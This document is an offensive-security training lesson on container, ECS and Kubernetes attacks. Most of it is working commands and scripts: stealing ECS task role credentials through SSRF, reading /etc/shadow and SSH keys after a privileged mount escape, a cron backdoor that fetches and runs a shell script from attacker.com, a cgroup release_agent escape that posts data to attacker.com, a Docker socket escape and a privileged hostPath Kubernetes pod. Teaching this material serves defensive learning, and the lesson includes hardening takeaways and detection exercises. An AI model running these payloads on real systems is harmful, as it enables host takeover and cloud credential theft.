---
title: "Container and ECS Attacks — Metadata from Containers, ECS Task Role,
  Privileged Container Escape"
tags: [containers, Docker, ECS, Kubernetes, privileged-escape, task-role,
       metadata, IMDS, container-security, ATT&CK-T1611, ATT&CK-T1552.005,
       CWE-250, cloud-exploitation]
module: 04-BroadSurface-02
day: 188
related_topics:
  - AWS IAM Fundamentals (Day 182)
  - Lambda and Serverless Attacks (Day 187)
  - Cloud Persistence Techniques (Day 191)
  - Cloud Hardening (Day 195)
---

# Day 188 — Container and ECS Attacks

> "Containers give you isolation until someone runs one with `--privileged`.
> Then you have everything the host has. The escape is one mount and one
> cgroup write away. And when the container is on AWS ECS, it has an IAM
> task role that the attacker walks out with. Containers are not a security
> boundary — they are a thin namespace with a credential endpoint attached."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Retrieve ECS task role credentials from the container metadata endpoint.
2. Escape a privileged Docker container to access the host filesystem.
3. Escape via the Docker socket if it is mounted inside the container.
4. Enumerate Kubernetes RBAC and exploit misconfigured service account tokens.
5. Identify the container-specific metadata endpoints for AWS ECS, Kubernetes,
   and GCP Cloud Run.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Docker basics | Days 150–151 |
| AWS IAM fundamentals | Day 182 |
| SSRF fundamentals | Day 113 |
| Linux privilege escalation concepts | Day 236 (upcoming) |

---

## Part 1 — ECS Task Role Credential Theft

ECS containers have a metadata endpoint (not `169.254.169.254` — different
from EC2 IMDS) that provides task role credentials.

### 1.1 — The ECS Container Metadata URI

```bash
# Inside an ECS container, these environment variables are automatically injected:
echo $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
# → /v2/credentials/3e0f0b91-9c4d-4dc0-ad52-0ea8ffcb3a89

echo $ECS_CONTAINER_METADATA_URI_V4
# → http://169.254.170.2/v4/f29fef93-a123-4567-bcde-8b97a34d8e22

# Retrieve task role credentials
curl http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
```

Output:
```json
{
  "RoleArn": "arn:aws:iam::123456789012:role/ecsTaskExecutionRole",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/...",
  "Token": "AQoDYXdzEJr...",
  "Expiration": "2024-01-01T12:00:00Z"
}
```

### 1.2 — SSRF to ECS Metadata Endpoint

If a container runs a web service with an SSRF vulnerability, the attacker
can reach the ECS metadata endpoint:

```bash
# SSRF exploit: fetch ECS metadata via a vulnerable URL-fetch endpoint
curl "http://vulnerable-app.example.com/fetch?url=\
http://169.254.170.2/v2/credentials/3e0f0b91-9c4d-4dc0-ad52-0ea8ffcb3a89"
```

**Key difference from EC2 IMDS:**
- EC2 IMDS is at `169.254.169.254` (well-known; easy to SSRF)
- ECS metadata is at `169.254.170.2/{unique-path}` (need to know the path)
- The path is in `$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` inside the container
- If you have RCE inside the container, read the env var and hit the endpoint

```python
# Exploit script: RCE → ECS metadata → exfiltrate credentials
import requests

def exploit_ssrf_to_ecs_metadata(ssrf_endpoint: str) -> dict:
    # Step 1: Read the container's env to get the metadata URI
    env_resp = requests.get(
        f"{ssrf_endpoint}?url=http://169.254.170.2/v4/\
{read_task_id}/task"
    )
    metadata = env_resp.json()
    task_creds_path = "/v2/credentials/" + metadata["TaskARN"].split("/")[-1]

    # Step 2: Fetch credentials
    creds_resp = requests.get(
        f"{ssrf_endpoint}?url=http://169.254.170.2{task_creds_path}"
    )
    return creds_resp.json()
```

---

## Part 2 — Privileged Container Escape

### 2.1 — Identifying a Privileged Container

```bash
# From inside the container: check capabilities
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff  ← all capabilities = privileged

# Or check if we have SYS_ADMIN
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}') \
  | grep sys_admin

# Check if the container can see host devices
ls /dev/sda* 2>/dev/null && echo "Host devices visible"
```

### 2.2 — Escape via Host Filesystem Mount

In a privileged container, the host filesystem can be mounted:

```bash
# List block devices (visible in privileged containers)
fdisk -l 2>/dev/null
lsblk

# Mount the host root filesystem
mkdir /tmp/host-root
mount /dev/xvda1 /tmp/host-root

# Read the host's shadow file (Linux credentials)
cat /tmp/host-root/etc/shadow

# Read SSH private keys
ls /tmp/host-root/root/.ssh/
cat /tmp/host-root/root/.ssh/id_rsa

# Write a cron job to the host (persistence)
echo "* * * * * root curl http://attacker.com/shell.sh | bash" \
  >> /tmp/host-root/etc/cron.d/backdoor

# Or: chroot into the host OS for a full root shell
chroot /tmp/host-root /bin/bash
id   # → uid=0(root) gid=0(root)  — host root, not container root
```

### 2.3 — Escape via cgroup v1 Notify-On-Release

This is the most reliable privileged escape technique:

```bash
# Source: Felix Wilhelm's CVE-2019-5736 related research
# Works when the container has SYS_ADMIN + cgroup v1

# Create a new cgroup
mkdir /tmp/cgroup
mount -t cgroup -o rdma cgroup /tmp/cgroup
mkdir /tmp/cgroup/x

# Enable notify_on_release
echo 1 > /tmp/cgroup/x/notify_on_release
echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)" \
  > /tmp/cgroup/x/release_agent

# Write a payload to the release agent path on the host
cat > /cmd <<EOF
#!/bin/sh
ps aux > /tmp/container_output
cat /tmp/container_output | curl -X POST http://attacker.com/escape -d @-
EOF
chmod +x /cmd

# Trigger the release agent by starting and stopping a process in the cgroup
sh -c "echo \$\$ > /tmp/cgroup/x/cgroup.procs"
# The host executes /cmd as root
```

---

## Part 3 — Docker Socket Escape

If the Docker socket (`/var/run/docker.sock`) is mounted inside a container,
the attacker has full control of the Docker daemon — and can create a new
privileged container that mounts the host filesystem.

```bash
# Check if the Docker socket is mounted
ls -la /var/run/docker.sock && echo "[+] Docker socket is mounted!"

# Use docker CLI inside the container
docker ps   # Can we see running containers?

# Escape: create a new privileged container that mounts the host root
docker run -it \
  --privileged \
  --pid=host \
  -v /:/host-root \
  ubuntu:22.04 \
  chroot /host-root /bin/bash

# Now inside a new container with full host access
id       # → uid=0(root)
hostname # → ip-10-0-1-100 (host hostname, not the container name)
```

### 3.1 — Detection of Docker Socket Abuse

The Docker socket is a high-severity finding when found in a container:

```bash
# Sigma rule equivalent — detect new privileged container creation
# CloudWatch (for ECS):
# EventSource: ecs.amazonaws.com
# EventName: RunTask
# requestParameters.overrides.containerOverrides[].privileged: true
```

---

## Part 4 — Kubernetes Attack Surface

### 4.1 — Service Account Token Access

Every Kubernetes pod has a service account token mounted at a well-known path:

```bash
# Inside a Kubernetes pod — always check this
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# → eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9...

# Use the token to access the Kubernetes API
KUBE_API="https://kubernetes.default.svc"
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# What can the service account do?
curl -s --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  "$KUBE_API/api/v1/namespaces"

# Can it list pods?
curl -s --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  "$KUBE_API/api/v1/pods"

# Can it create pods? (escalation path)
curl -s --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST "$KUBE_API/api/v1/namespaces/default/pods" \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"escape"},
       "spec":{"containers":[{"name":"escape","image":"ubuntu",
       "command":["chroot","/host","/bin/bash"],
       "securityContext":{"privileged":true},
       "volumeMounts":[{"mountPath":"/host","name":"host"}]}],
       "volumes":[{"name":"host","hostPath":{"path":"/"}}]}}'
```

### 4.2 — Kubernetes Exposed Dashboard / API Server

```bash
# Scan for exposed Kubernetes API server
nmap -p 6443,8443,8080 target-range

# Unauthenticated access check
curl -sk https://k8s-master:6443/api/v1/namespaces
# If it returns data without a token → anonymous access is enabled

# Exposed Dashboard (commonly port 8001 or 8443)
curl http://k8s-dashboard:8001/api/v1/namespaces/kube-system/pods
```

---

## Part 5 — Containers in the Attack Kill Chain

```
Web app SSRF or code execution
  ↓
Container escape (privileged / Docker socket / cgroup)
  ↓
Host-level access
  ↓
EC2 IMDS or ECS task role credentials
  ↓
AWS credentials extracted
  ↓
IAM enumeration → privilege escalation → account-wide access
```

**This is the full cloud exploitation kill chain.** A single SSRF in a
containerised application on ECS can produce domain admin-equivalent (account
admin) access in under 10 minutes with the right automation.

---

## Key Takeaways

1. **`--privileged` containers are not containers — they are root shells with
   extra steps.** A privileged container has the same capabilities as the host
   root. Treat any `--privileged` flag in a production container as a critical
   vulnerability.
2. **The Docker socket mounted inside a container is a host escape.** It
   grants full Docker daemon control, which is equivalent to root on the host.
   Never mount `/var/run/docker.sock` in production containers.
3. **ECS task role credentials are at a different endpoint than EC2 IMDS.**
   `169.254.170.2` with a unique path from `$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`.
   SSRF to this endpoint requires knowing the path — often via environment variable
   exposure or task metadata enumeration.
4. **Kubernetes service account tokens are auto-mounted.** Every pod has
   credentials. If the service account has permissive RBAC (especially
   `cluster-admin`), the token is a full cluster takeover.
5. **Container security is not the application security team's problem — it
   is everyone's problem.** The application team writes the Dockerfile, the
   DevOps team runs it, the security team needs to audit both.

---

## Exercises

1. Run a privileged Docker container locally: `docker run --privileged -it
   ubuntu bash`. Inside: confirm capabilities, mount the host disk, read
   `/etc/shadow` from the host. Then confirm a non-privileged container cannot
   do the same steps.
2. Mount the Docker socket inside a non-privileged container:
   `docker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu bash`.
   Install Docker CLI inside the container. Create a new privileged container
   that mounts the host root. Confirm you have host root access.
3. Research: what is the `seccomp` profile in Docker and how does it limit
   the cgroup escape technique from Part 2.3? What specific syscall does it
   block?
4. Write a Sigma or Falco rule that detects: (a) a container accessing the
   ECS metadata endpoint (`169.254.170.2`); (b) a container executing
   `mount` on a host block device. What log source provides these events in
   a Falco deployment?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q188.1, Q188.2 …).
> Follow-up questions use hierarchical numbering (Q188.1.1, Q188.1.2 …).

---

## Navigation

← Previous: [Day 187 — Lambda and Serverless Attacks](DAY-0187-Lambda-and-Serverless-Attacks.md)
→ Next: [Day 189 — Azure for Attackers](DAY-0189-Azure-for-Attackers.md)
